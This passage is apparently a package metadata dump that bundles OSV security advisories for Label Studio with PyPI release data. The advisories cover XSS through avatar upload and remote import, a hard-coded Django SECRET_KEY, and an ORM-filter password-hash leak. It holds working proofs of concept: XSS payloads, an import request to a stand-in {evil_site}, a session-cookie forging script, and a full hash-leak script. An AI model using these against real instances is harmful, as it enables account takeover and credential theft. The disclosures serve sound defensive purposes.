avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.7.4.post1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.7.4.post1/","requires_dist":["rarfile (==3.1)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.18)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.7.4.post1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"b8be12fb2695f5aa48d9c36a3e81be007ac8f0fb49c2e73086f8419a25806ca0","md5":"3398e92adeb5f17de7ca4fb3ea340306","sha256":"a00ecacc3ae1106002a8b4e7be841a71fb956539d891790bca50777a0526e2af"},"downloads":-1,"filename":"label_studio-0.7.4.post1-py3-none-any.whl","has_sig":false,"md5_digest":"3398e92adeb5f17de7ca4fb3ea340306","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6913195,"upload_time":"2020-10-08T14:25:41","upload_time_iso_8601":"2020-10-08T14:25:41.997019Z","url":"https://files.pythonhosted.org/packages/b8/be/12fb2695f5aa48d9c36a3e81be007ac8f0fb49c2e73086f8419a25806ca0/label_studio-0.7.4.post1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"a54eda190969b0cb2394235afaedef5bbc3fa943a76a3d2531601e806cc89af6","md5":"cfbd75d71b13b6d14136240d3e78cd0a","sha256":"748a1c67355c9c56662f650bdf56b70f2cb3714ffdc4e346cee27444d88b2806"},"downloads":-1,"filename":"label-studio-0.7.4.post1.tar.gz","has_sig":false,"md5_digest":"cfbd75d71b13b6d141